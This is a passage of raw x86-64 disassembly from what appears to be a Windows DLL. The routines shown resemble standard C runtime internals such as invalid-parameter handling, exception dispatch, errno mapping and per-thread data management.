   180002583:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180002587:	49 8b 73 30          	mov    0x30(%r11),%rsi
   18000258b:	49 8b e3             	mov    %r11,%rsp
   18000258e:	41 5c                	pop    %r12
   180002590:	5f                   	pop    %rdi
   180002591:	5d                   	pop    %rbp
   180002592:	c3                   	ret
   180002593:	cc                   	int3
   180002594:	48 83 ec 28          	sub    $0x28,%rsp
   180002598:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000259e:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1800025a3:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1800025a7:	e8 9c fe ff ff       	call   0x180002448
   1800025ac:	ff 15 ee 6a 00 00    	call   *0x6aee(%rip)        # 0x1800090a0
   1800025b2:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1800025b7:	48 8b c8             	mov    %rax,%rcx
   1800025ba:	48 83 c4 28          	add    $0x28,%rsp
   1800025be:	48 ff 25 d3 6a 00 00 	rex.W jmp *0x6ad3(%rip)        # 0x180009098
   1800025c5:	cc                   	int3
   1800025c6:	cc                   	int3
   1800025c7:	cc                   	int3
   1800025c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800025cd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800025d2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800025d7:	57                   	push   %rdi
   1800025d8:	48 83 ec 30          	sub    $0x30,%rsp
   1800025dc:	48 8b e9             	mov    %rcx,%rbp
   1800025df:	48 8b 0d ea ad 00 00 	mov    0xadea(%rip),%rcx        # 0x18000d3d0
   1800025e6:	41 8b d9             	mov    %r9d,%ebx
   1800025e9:	49 8b f8             	mov    %r8,%rdi
   1800025ec:	48 8b f2             	mov    %rdx,%rsi
   1800025ef:	ff 15 63 6a 00 00    	call   *0x6a63(%rip)        # 0x180009058
   1800025f5:	44 8b cb             	mov    %ebx,%r9d
   1800025f8:	4c 8b c7             	mov    %rdi,%r8
   1800025fb:	48 8b d6             	mov    %rsi,%rdx
   1800025fe:	48 8b cd             	mov    %rbp,%rcx
   180002601:	48 85 c0             	test   %rax,%rax
   180002604:	74 21                	je     0x180002627
   180002606:	4c 8b 54 24 60       	mov    0x60(%rsp),%r10
   18000260b:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   180002610:	ff d0                	call   *%rax
   180002612:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180002617:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000261c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180002621:	48 83 c4 30          	add    $0x30,%rsp
   180002625:	5f                   	pop    %rdi
   180002626:	c3                   	ret
   180002627:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   18000262c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002631:	e8 5e ff ff ff       	call   0x180002594
   180002636:	cc                   	int3
   180002637:	cc                   	int3
   180002638:	48 83 ec 38          	sub    $0x38,%rsp
   18000263c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180002642:	45 33 c9             	xor    %r9d,%r9d
   180002645:	45 33 c0             	xor    %r8d,%r8d
   180002648:	33 d2                	xor    %edx,%edx
   18000264a:	33 c9                	xor    %ecx,%ecx
   18000264c:	e8 77 ff ff ff       	call   0x1800025c8
   180002651:	48 83 c4 38          	add    $0x38,%rsp
   180002655:	c3                   	ret
   180002656:	cc                   	int3
   180002657:	cc                   	int3
   180002658:	4c 8d 0d b1 99 00 00 	lea    0x99b1(%rip),%r9        # 0x18000c010
   18000265f:	33 c0                	xor    %eax,%eax
   180002661:	49 8b d1             	mov    %r9,%rdx
   180002664:	44 8d 40 08          	lea    0x8(%rax),%r8d
   180002668:	3b 0a                	cmp    (%rdx),%ecx
   18000266a:	74 2b                	je     0x180002697
   18000266c:	ff c0                	inc    %eax
   18000266e:	49 03 d0             	add    %r8,%rdx
   180002671:	83 f8 2d             	cmp    $0x2d,%eax
   180002674:	72 f2                	jb     0x180002668
   180002676:	8d 41 ed             	lea    -0x13(%rcx),%eax
   180002679:	83 f8 11             	cmp    $0x11,%eax
   18000267c:	77 06                	ja     0x180002684
   18000267e:	b8 0d 00 00 00       	mov    $0xd,%eax
   180002683:	c3                   	ret
   180002684:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   18000268a:	b8 16 00 00 00       	mov    $0x16,%eax
   18000268f:	83 f9 0e             	cmp    $0xe,%ecx
   180002692:	41 0f 46 c0          	cmovbe %r8d,%eax
   180002696:	c3                   	ret
   180002697:	48 98                	cltq
   180002699:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   18000269e:	c3                   	ret
   18000269f:	cc                   	int3
   1800026a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800026a4:	e8 6f 03 00 00       	call   0x180002a18
   1800026a9:	48 85 c0             	test   %rax,%rax
   1800026ac:	75 09                	jne    0x1800026b7
   1800026ae:	48 8d 05 c3 9a 00 00 	lea    0x9ac3(%rip),%rax        # 0x18000c178
   1800026b5:	eb 04                	jmp    0x1800026bb
   1800026b7:	48 83 c0 10          	add    $0x10,%rax
   1800026bb:	48 83 c4 28          	add    $0x28,%rsp
   1800026bf:	c3                   	ret
   1800026c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800026c4:	e8 4f 03 00 00       	call   0x180002a18
   1800026c9:	48 85 c0             	test   %rax,%rax
   1800026cc:	75 09                	jne    0x1800026d7
   1800026ce:	48 8d 05 a7 9a 00 00 	lea    0x9aa7(%rip),%rax        # 0x18000c17c
   1800026d5:	eb 04                	jmp    0x1800026db
   1800026d7:	48 83 c0 14          	add    $0x14,%rax
   1800026db:	48 83 c4 28          	add    $0x28,%rsp
   1800026df:	c3                   	ret
   1800026e0:	40 53                	rex push %rbx
   1800026e2:	48 83 ec 20          	sub    $0x20,%rsp
   1800026e6:	8b d9                	mov    %ecx,%ebx
   1800026e8:	e8 2b 03 00 00       	call   0x180002a18
   1800026ed:	48 85 c0             	test   %rax,%rax
   1800026f0:	75 09                	jne    0x1800026fb
   1800026f2:	48 8d 05 83 9a 00 00 	lea    0x9a83(%rip),%rax        # 0x18000c17c
   1800026f9:	eb 04                	jmp    0x1800026ff
   1800026fb:	48 83 c0 14          	add    $0x14,%rax
   1800026ff:	89 18                	mov    %ebx,(%rax)
   180002701:	e8 12 03 00 00       	call   0x180002a18
   180002706:	4c 8d 15 6b 9a 00 00 	lea    0x9a6b(%rip),%r10        # 0x18000c178
   18000270d:	48 85 c0             	test   %rax,%rax
   180002710:	74 04                	je     0x180002716
   180002712:	4c 8d 50 10          	lea    0x10(%rax),%r10
   180002716:	8b cb                	mov    %ebx,%ecx
   180002718:	e8 3b ff ff ff       	call   0x180002658
   18000271d:	41 89 02             	mov    %eax,(%r10)
   180002720:	48 83 c4 20          	add    $0x20,%rsp
   180002724:	5b                   	pop    %rbx
   180002725:	c3                   	ret
   180002726:	cc                   	int3
   180002727:	cc                   	int3
   180002728:	4c 8b dc             	mov    %rsp,%r11
   18000272b:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   18000272f:	49 89 6b 18          	mov    %rbp,0x18(%r11)
   180002733:	49 89 73 20          	mov    %rsi,0x20(%r11)
   180002737:	49 89 53 10          	mov    %rdx,0x10(%r11)
   18000273b:	57                   	push   %rdi
   18000273c:	41 54                	push   %r12
   18000273e:	41 55                	push   %r13
   180002740:	41 56                	push   %r14
   180002742:	41 57                	push   %r15
   180002744:	48 83 ec 40          	sub    $0x40,%rsp
   180002748:	4d 8b 79 08          	mov    0x8(%r9),%r15
   18000274c:	4d 8b 31             	mov    (%r9),%r14
   18000274f:	8b 41 04             	mov    0x4(%rcx),%eax
   180002752:	49 8b 79 38          	mov    0x38(%r9),%rdi
   180002756:	4d 2b f7             	sub    %r15,%r14
   180002759:	4d 8b e1             	mov    %r9,%r12
   18000275c:	4c 8b ea             	mov    %rdx,%r13
   18000275f:	48 8b e9             	mov    %rcx,%rbp
   180002762:	a8 66                	test   $0x66,%al
   180002764:	0f 85 ed 00 00 00    	jne    0x180002857
   18000276a:	49 63 71 48          	movslq 0x48(%r9),%rsi
   18000276e:	49 89 4b c8          	mov    %rcx,-0x38(%r11)
   180002772:	4d 89 43 d0          	mov    %r8,-0x30(%r11)
   180002776:	48 8b c6             	mov    %rsi,%rax
   180002779:	3b 37                	cmp    (%rdi),%esi
   18000277b:	0f 83 81 01 00 00    	jae    0x180002902
   180002781:	48 03 c0             	add    %rax,%rax
   180002784:	48 8d 5c c7 0c       	lea    0xc(%rdi,%rax,8),%rbx
   180002789:	8b 43 f8             	mov    -0x8(%rbx),%eax
   18000278c:	4c 3b f0             	cmp    %rax,%r14
   18000278f:	0f 82 a8 00 00 00    	jb     0x18000283d
   180002795:	8b 43 fc             	mov    -0x4(%rbx),%eax
   180002798:	4c 3b f0             	cmp    %rax,%r14
   18000279b:	0f 83 9c 00 00 00    	jae    0x18000283d
   1800027a1:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   1800027a5:	0f 84 92 00 00 00    	je     0x18000283d
   1800027ab:	83 3b 01             	cmpl   $0x1,(%rbx)
   1800027ae:	74 19                	je     0x1800027c9
   1800027b0:	8b 03                	mov    (%rbx),%eax
   1800027b2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800027b7:	49 8b d5             	mov    %r13,%rdx
   1800027ba:	49 03 c7             	add    %r15,%rax
   1800027bd:	ff d0                	call   *%rax
   1800027bf:	85 c0                	test   %eax,%eax
   1800027c1:	0f 88 89 00 00 00    	js     0x180002850
   1800027c7:	7e 74                	jle    0x18000283d
   1800027c9:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   1800027d0:	75 28                	jne    0x1800027fa
   1800027d2:	48 83 3d 76 ce 00 00 	cmpq   $0x0,0xce76(%rip)        # 0x18000f650
   1800027d9:	00 
   1800027da:	74 1e                	je     0x1800027fa
   1800027dc:	48 8d 0d 6d ce 00 00 	lea    0xce6d(%rip),%rcx        # 0x18000f650
   1800027e3:	e8 a8 33 00 00       	call   0x180005b90
   1800027e8:	85 c0                	test   %eax,%eax
   1800027ea:	74 0e                	je     0x1800027fa
   1800027ec:	ba 01 00 00 00       	mov    $0x1,%edx
   1800027f1:	48 8b cd             	mov    %rbp,%rcx
   1800027f4:	ff 15 56 ce 00 00    	call   *0xce56(%rip)        # 0x18000f650
   1800027fa:	8b 4b 04             	mov    0x4(%rbx),%ecx
   1800027fd:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180002803:	49 8b d5             	mov    %r13,%rdx
   180002806:	49 03 cf             	add    %r15,%rcx
   180002809:	e8 c2 32 00 00       	call   0x180005ad0
   18000280e:	49 8b 44 24 40       	mov    0x40(%r12),%rax
   180002813:	8b 53 04             	mov    0x4(%rbx),%edx
   180002816:	4c 63 4d 00          	movslq 0x0(%rbp),%r9
   18000281a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000281f:	49 8b 44 24 28       	mov    0x28(%r12),%rax
   180002824:	49 03 d7             	add    %r15,%rdx
   180002827:	4c 8b c5             	mov    %rbp,%r8
   18000282a:	49 8b cd             	mov    %r13,%rcx
   18000282d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002832:	ff 15 70 68 00 00    	call   *0x6870(%rip)        # 0x1800090a8
   180002838:	e8 c3 32 00 00       	call   0x180005b00
   18000283d:	ff c6                	inc    %esi
   18000283f:	48 83 c3 10          	add    $0x10,%rbx
   180002843:	3b 37                	cmp    (%rdi),%esi
   180002845:	0f 83 b7 00 00 00    	jae    0x180002902
   18000284b:	e9 39 ff ff ff       	jmp    0x180002789
   180002850:	33 c0                	xor    %eax,%eax
   180002852:	e9 b0 00 00 00       	jmp    0x180002907
   180002857:	4d 8b 41 20          	mov    0x20(%r9),%r8
   18000285b:	33 ed                	xor    %ebp,%ebp
   18000285d:	45 33 ed             	xor    %r13d,%r13d
   180002860:	4d 2b c7             	sub    %r15,%r8
   180002863:	a8 20                	test   $0x20,%al
   180002865:	74 3b                	je     0x1800028a2
   180002867:	33 d2                	xor    %edx,%edx
   180002869:	39 17                	cmp    %edx,(%rdi)
   18000286b:	76 35                	jbe    0x1800028a2
   18000286d:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   180002871:	8b 41 fc             	mov    -0x4(%rcx),%eax
   180002874:	4c 3b c0             	cmp    %rax,%r8
   180002877:	72 07                	jb     0x180002880
   180002879:	8b 01                	mov    (%rcx),%eax
   18000287b:	4c 3b c0             	cmp    %rax,%r8
   18000287e:	76 0c                	jbe    0x18000288c
   180002880:	ff c2                	inc    %edx
   180002882:	48 83 c1 10          	add    $0x10,%rcx
   180002886:	3b 17                	cmp    (%rdi),%edx
   180002888:	73 18                	jae    0x1800028a2
   18000288a:	eb e5                	jmp    0x180002871
   18000288c:	8b c2                	mov    %edx,%eax
   18000288e:	48 03 c0             	add    %rax,%rax
   180002891:	8b 4c c7 10          	mov    0x10(%rdi,%rax,8),%ecx
   180002895:	85 c9                	test   %ecx,%ecx
   180002897:	75 06                	jne    0x18000289f
   180002899:	8b 6c c7 0c          	mov    0xc(%rdi,%rax,8),%ebp
   18000289d:	eb 03                	jmp    0x1800028a2
   18000289f:	44 8b e9             	mov    %ecx,%r13d
   1800028a2:	49 63 71 48          	movslq 0x48(%r9),%rsi
   1800028a6:	48 8b de             	mov    %rsi,%rbx
   1800028a9:	3b 37                	cmp    (%rdi),%esi
   1800028ab:	73 55                	jae    0x180002902
   1800028ad:	48 ff c3             	inc    %rbx
   1800028b0:	48 c1 e3 04          	shl    $0x4,%rbx
   1800028b4:	48 03 df             	add    %rdi,%rbx
   1800028b7:	8b 43 f4             	mov    -0xc(%rbx),%eax
   1800028ba:	4c 3b f0             	cmp    %rax,%r14
   1800028bd:	72 39                	jb     0x1800028f8
   1800028bf:	8b 43 f8             	mov    -0x8(%rbx),%eax
   1800028c2:	4c 3b f0             	cmp    %rax,%r14
   1800028c5:	73 31                	jae    0x1800028f8
   1800028c7:	45 85 ed             	test   %r13d,%r13d
   1800028ca:	74 05                	je     0x1800028d1
   1800028cc:	44 3b 2b             	cmp    (%rbx),%r13d
   1800028cf:	74 31                	je     0x180002902
   1800028d1:	85 ed                	test   %ebp,%ebp
   1800028d3:	74 05                	je     0x1800028da
   1800028d5:	3b 6b fc             	cmp    -0x4(%rbx),%ebp
   1800028d8:	74 28                	je     0x180002902
   1800028da:	83 3b 00             	cmpl   $0x0,(%rbx)
   1800028dd:	75 19                	jne    0x1800028f8
   1800028df:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   1800028e4:	8d 46 01             	lea    0x1(%rsi),%eax
   1800028e7:	b1 01                	mov    $0x1,%cl
   1800028e9:	41 89 44 24 48       	mov    %eax,0x48(%r12)
   1800028ee:	44 8b 43 fc          	mov    -0x4(%rbx),%r8d
   1800028f2:	4d 03 c7             	add    %r15,%r8
   1800028f5:	41 ff d0             	call   *%r8
   1800028f8:	ff c6                	inc    %esi
   1800028fa:	48 83 c3 10          	add    $0x10,%rbx
   1800028fe:	3b 37                	cmp    (%rdi),%esi
   180002900:	72 b5                	jb     0x1800028b7
   180002902:	b8 01 00 00 00       	mov    $0x1,%eax
   180002907:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   18000290c:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180002910:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   180002914:	49 8b 73 48          	mov    0x48(%r11),%rsi
   180002918:	49 8b e3             	mov    %r11,%rsp
   18000291b:	41 5f                	pop    %r15
   18000291d:	41 5e                	pop    %r14
   18000291f:	41 5d                	pop    %r13
   180002921:	41 5c                	pop    %r12
   180002923:	5f                   	pop    %rdi
   180002924:	c3                   	ret
   180002925:	cc                   	int3
   180002926:	cc                   	int3
   180002927:	cc                   	int3
   180002928:	33 c9                	xor    %ecx,%ecx
   18000292a:	48 ff 25 5f 67 00 00 	rex.W jmp *0x675f(%rip)        # 0x180009090
   180002931:	cc                   	int3
   180002932:	cc                   	int3
   180002933:	cc                   	int3
   180002934:	33 c0                	xor    %eax,%eax
   180002936:	c3                   	ret
   180002937:	cc                   	int3
   180002938:	48 83 ec 28          	sub    $0x28,%rsp
   18000293c:	8b 0d 3e 98 00 00    	mov    0x983e(%rip),%ecx        # 0x18000c180
   180002942:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180002945:	74 0d                	je     0x180002954
   180002947:	ff 15 6b 67 00 00    	call   *0x676b(%rip)        # 0x1800090b8
   18000294d:	83 0d 2c 98 00 00 ff 	orl    $0xffffffff,0x982c(%rip)        # 0x18000c180
   180002954:	48 83 c4 28          	add    $0x28,%rsp
   180002958:	e9 fb 32 00 00       	jmp    0x180005c58
   18000295d:	cc                   	int3
   18000295e:	cc                   	int3
   18000295f:	cc                   	int3
   180002960:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002965:	57                   	push   %rdi
   180002966:	48 83 ec 20          	sub    $0x20,%rsp
   18000296a:	48 8b fa             	mov    %rdx,%rdi
   18000296d:	48 8b d9             	mov    %rcx,%rbx
   180002970:	48 8d 05 19 6a 00 00 	lea    0x6a19(%rip),%rax        # 0x180009390
   180002977:	48 89 81 a0 00 00 00 	mov    %rax,0xa0(%rcx)
   18000297e:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   180002982:	c7 41 1c 01 00 00 00 	movl   $0x1,0x1c(%rcx)
   180002989:	c7 81 c8 00 00 00 01 	movl   $0x1,0xc8(%rcx)
   180002990:	00 00 00 
   180002993:	c6 81 74 01 00 00 43 	movb   $0x43,0x174(%rcx)
   18000299a:	c6 81 f7 01 00 00 43 	movb   $0x43,0x1f7(%rcx)
   1800029a1:	48 8d 05 08 9c 00 00 	lea    0x9c08(%rip),%rax        # 0x18000c5b0
   1800029a8:	48 89 81 b8 00 00 00 	mov    %rax,0xb8(%rcx)
   1800029af:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1800029b4:	e8 27 34 00 00       	call   0x180005de0
   1800029b9:	90                   	nop
   1800029ba:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   1800029c1:	f0 ff 00             	lock incl (%rax)
   1800029c4:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1800029c9:	e8 12 33 00 00       	call   0x180005ce0
   1800029ce:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1800029d3:	e8 08 34 00 00       	call   0x180005de0
   1800029d8:	90                   	nop
   1800029d9:	48 89 bb c0 00 00 00 	mov    %rdi,0xc0(%rbx)
   1800029e0:	48 85 ff             	test   %rdi,%rdi
   1800029e3:	75 0e                	jne    0x1800029f3
   1800029e5:	48 8b 05 24 a5 00 00 	mov    0xa524(%rip),%rax        # 0x18000cf10
   1800029ec:	48 89 83 c0 00 00 00 	mov    %rax,0xc0(%rbx)
   1800029f3:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   1800029fa:	e8 d1 28 00 00       	call   0x1800052d0
   1800029ff:	90                   	nop
   180002a00:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180002a05:	e8 d6 32 00 00       	call   0x180005ce0
   180002a0a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002a0f:	48 83 c4 20          	add    $0x20,%rsp
   180002a13:	5f                   	pop    %rdi
   180002a14:	c3                   	ret
   180002a15:	cc                   	int3
   180002a16:	cc                   	int3
   180002a17:	cc                   	int3
   180002a18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002a1d:	57                   	push   %rdi
   180002a1e:	48 83 ec 20          	sub    $0x20,%rsp
   180002a22:	ff 15 a0 66 00 00    	call   *0x66a0(%rip)        # 0x1800090c8
   180002a28:	8b 0d 52 97 00 00    	mov    0x9752(%rip),%ecx        # 0x18000c180
   180002a2e:	8b f8                	mov    %eax,%edi
   180002a30:	ff 15 7a 66 00 00    	call   *0x667a(%rip)        # 0x1800090b0
   180002a36:	48 8b d8             	mov    %rax,%rbx
   180002a39:	48 85 c0             	test   %rax,%rax
   180002a3c:	75 48                	jne    0x180002a86
   180002a3e:	8d 48 01             	lea    0x1(%rax),%ecx
   180002a41:	ba c8 02 00 00       	mov    $0x2c8,%edx
   180002a46:	e8 2d 03 00 00       	call   0x180002d78
   180002a4b:	48 8b d8             	mov    %rax,%rbx
   180002a4e:	48 85 c0             	test   %rax,%rax
   180002a51:	74 33                	je     0x180002a86
   180002a53:	8b 0d 27 97 00 00    	mov    0x9727(%rip),%ecx        # 0x18000c180
   180002a59:	48 8b d0             	mov    %rax,%rdx
   180002a5c:	ff 15 e6 65 00 00    	call   *0x65e6(%rip)        # 0x180009048
   180002a62:	48 8b cb             	mov    %rbx,%rcx
   180002a65:	85 c0                	test   %eax,%eax
   180002a67:	74 16                	je     0x180002a7f
   180002a69:	33 d2                	xor    %edx,%edx
   180002a6b:	e8 f0 fe ff ff       	call   0x180002960
   180002a70:	ff 15 ca 65 00 00    	call   *0x65ca(%rip)        # 0x180009040
   180002a76:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   180002a7b:	89 03                	mov    %eax,(%rbx)
   180002a7d:	eb 07                	jmp    0x180002a86
   180002a7f:	e8 34 02 00 00       	call   0x180002cb8
   180002a84:	33 db                	xor    %ebx,%ebx
   180002a86:	8b cf                	mov    %edi,%ecx
   180002a88:	ff 15 32 66 00 00    	call   *0x6632(%rip)        # 0x1800090c0
   180002a8e:	48 8b c3             	mov    %rbx,%rax
   180002a91:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002a96:	48 83 c4 20          	add    $0x20,%rsp
   180002a9a:	5f                   	pop    %rdi
   180002a9b:	c3                   	ret
   180002a9c:	40 53                	rex push %rbx
   180002a9e:	48 83 ec 20          	sub    $0x20,%rsp
   180002aa2:	e8 71 ff ff ff       	call   0x180002a18
   180002aa7:	48 8b d8             	mov    %rax,%rbx
   180002aaa:	48 85 c0             	test   %rax,%rax
   180002aad:	75 08                	jne    0x180002ab7
   180002aaf:	8d 48 10             	lea    0x10(%rax),%ecx
   180002ab2:	e8 49 07 00 00       	call   0x180003200
   180002ab7:	48 8b c3             	mov    %rbx,%rax
   180002aba:	48 83 c4 20          	add    $0x20,%rsp
   180002abe:	5b                   	pop    %rbx
   180002abf:	c3                   	ret
   180002ac0:	48 85 c9             	test   %rcx,%rcx
   180002ac3:	0f 84 29 01 00 00    	je     0x180002bf2
   180002ac9:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002ace:	57                   	push   %rdi
   180002acf:	48 83 ec 20          	sub    $0x20,%rsp
   180002ad3:	48 8b d9             	mov    %rcx,%rbx
   180002ad6:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   180002ada:	48 85 c9             	test   %rcx,%rcx
   180002add:	74 05                	je     0x180002ae4
   180002adf:	e8 d4 01 00 00       	call   0x180002cb8
   180002ae4:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   180002ae8:	48 85 c9             	test   %rcx,%rcx
   180002aeb:	74 05                	je     0x180002af2
   180002aed:	e8 c6 01 00 00       	call   0x180002cb8
   180002af2:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   180002af6:	48 85 c9             	test   %rcx,%rcx
   180002af9:	74 05                	je     0x180002b00
   180002afb:	e8 b8 01 00 00       	call   0x180002cb8
   180002b00:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   180002b04:	48 85 c9             	test   %rcx,%rcx
   180002b07:	74 05                	je     0x180002b0e
   180002b09:	e8 aa 01 00 00       	call   0x180002cb8
   180002b0e:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   180002b12:	48 85 c9             	test   %rcx,%rcx
   180002b15:	74 05                	je     0x180002b1c
   180002b17:	e8 9c 01 00 00       	call   0x180002cb8
   180002b1c:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   180002b20:	48 85 c9             	test   %rcx,%rcx
   180002b23:	74 05                	je     0x180002b2a
   180002b25:	e8 8e 01 00 00       	call   0x180002cb8
   180002b2a:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   180002b31:	48 85 c9             	test   %rcx,%rcx
   180002b34:	74 05                	je     0x180002b3b
   180002b36:	e8 7d 01 00 00       	call   0x180002cb8
   180002b3b:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   180002b42:	48 8d 05 47 68 00 00 	lea    0x6847(%rip),%rax        # 0x180009390
   180002b49:	48 3b c8             	cmp    %rax,%rcx
   180002b4c:	74 05                	je     0x180002b53
   180002b4e:	e8 65 01 00 00       	call   0x180002cb8
   180002b53:	bf 0d 00 00 00       	mov    $0xd,%edi
   180002b58:	8b cf                	mov    %edi,%ecx
   180002b5a:	e8 81 32 00 00       	call   0x180005de0
   180002b5f:	90                   	nop
   180002b60:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   180002b67:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002b6c:	48 85 c9             	test   %rcx,%rcx
   180002b6f:	74 1c                	je     0x180002b8d
   180002b71:	f0 ff 09             	lock decl (%rcx)
   180002b74:	75 17                	jne    0x180002b8d
   180002b76:	48 8d 05 33 9a 00 00 	lea    0x9a33(%rip),%rax        # 0x18000c5b0
   180002b7d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180002b82:	48 3b c8             	cmp    %rax,%rcx
   180002b85:	74 06                	je     0x180002b8d
   180002b87:	e8 2c 01 00 00       	call   0x180002cb8
   180002b8c:	90                   	nop
   180002b8d:	8b cf                	mov    %edi,%ecx
   180002b8f:	e8 4c 31 00 00       	call   0x180005ce0
   180002b94:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180002b99:	e8 42 32 00 00       	call   0x180005de0
   180002b9e:	90                   	nop
   180002b9f:	48 8b bb c0 00 00 00 	mov    0xc0(%rbx),%rdi
   180002ba6:	48 85 ff             	test   %rdi,%rdi
   180002ba9:	74 2b                	je     0x180002bd6
   180002bab:	48 8b cf             	mov    %rdi,%rcx
   180002bae:	e8 a9 27 00 00       	call   0x18000535c
   180002bb3:	48 3b 3d 56 a3 00 00 	cmp    0xa356(%rip),%rdi        # 0x18000cf10
   180002bba:	74 1a                	je     0x180002bd6
   180002bbc:	48 8d 05 ed a1 00 00 	lea    0xa1ed(%rip),%rax        # 0x18000cdb0
   180002bc3:	48 3b f8             	cmp    %rax,%rdi
   180002bc6:	74 0e                	je     0x180002bd6
   180002bc8:	83 3f 00             	cmpl   $0x0,(%rdi)
   180002bcb:	75 09                	jne    0x180002bd6
   180002bcd:	48 8b cf             	mov    %rdi,%rcx
   180002bd0:	e8 2b 28 00 00       	call   0x180005400
   180002bd5:	90                   	nop
   180002bd6:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180002bdb:	e8 00 31 00 00       	call   0x180005ce0
   180002be0:	48 8b cb             	mov    %rbx,%rcx
   180002be3:	e8 d0 00 00 00       	call   0x180002cb8
   180002be8:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180002bed:	48 83 c4 20          	add    $0x20,%rsp
   180002bf1:	5f                   	pop    %rdi
   180002bf2:	c3                   	ret
   180002bf3:	cc                   	int3
   180002bf4:	40 53                	rex push %rbx
   180002bf6:	48 83 ec 20          	sub    $0x20,%rsp
   180002bfa:	48 8b d9             	mov    %rcx,%rbx
   180002bfd:	8b 0d 7d 95 00 00    	mov    0x957d(%rip),%ecx        # 0x18000c180
   180002c03:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180002c06:	74 24                	je     0x180002c2c
   180002c08:	48 85 db             	test   %rbx,%rbx
   180002c0b:	75 0f                	jne    0x180002c1c
   180002c0d:	ff 15 9d 64 00 00    	call   *0x649d(%rip)        # 0x1800090b0
   180002c13:	8b 0d 67 95 00 00    	mov    0x9567(%rip),%ecx        # 0x18000c180
   180002c19:	48 8b d8             	mov    %rax,%rbx
   180002c1c:	33 d2                	xor    %edx,%edx
   180002c1e:	ff 15 24 64 00 00    	call   *0x6424(%rip)        # 0x180009048
   180002c24:	48 8b cb             	mov    %rbx,%rcx
   180002c27:	e8 94 fe ff ff       	call   0x180002ac0
   180002c2c:	48 83 c4 20          	add    $0x20,%rsp
   180002c30:	5b                   	pop    %rbx
   180002c31:	c3                   	ret
   180002c32:	cc                   	int3
   180002c33:	cc                   	int3
   180002c34:	40 53                	rex push %rbx
   180002c36:	48 83 ec 20          	sub    $0x20,%rsp
   180002c3a:	e8 b1 02 00 00       	call   0x180002ef0
   180002c3f:	e8 90 2f 00 00       	call   0x180005bd4
   180002c44:	85 c0                	test   %eax,%eax
   180002c46:	74 60                	je     0x180002ca8
   180002c48:	48 8d 0d 71 fe ff ff 	lea    -0x18f(%rip),%rcx        # 0x180002ac0
   180002c4f:	ff 15 7b 64 00 00    	call   *0x647b(%rip)        # 0x1800090d0
   180002c55:	89 05 25 95 00 00    	mov    %eax,0x9525(%rip)        # 0x18000c180
   180002c5b:	83 f8 ff             	cmp    $0xffffffff,%eax
   180002c5e:	74 48                	je     0x180002ca8
   180002c60:	ba c8 02 00 00       	mov    $0x2c8,%edx
   180002c65:	b9 01 00 00 00       	mov    $0x1,%ecx
   180002c6a:	e8 09 01 00 00       	call   0x180002d78
   180002c6f:	48 8b d8             	mov    %rax,%rbx
   180002c72:	48 85 c0             	test   %rax,%rax
   180002c75:	74 31                	je     0x180002ca8
   180002c77:	8b 0d 03 95 00 00    	mov    0x9503(%rip),%ecx        # 0x18000c180
   180002c7d:	48 8b d0             	mov    %rax,%rdx
   180002c80:	ff 15 c2 63 00 00    	call   *0x63c2(%rip)        # 0x180009048
   180002c86:	85 c0                	test   %eax,%eax
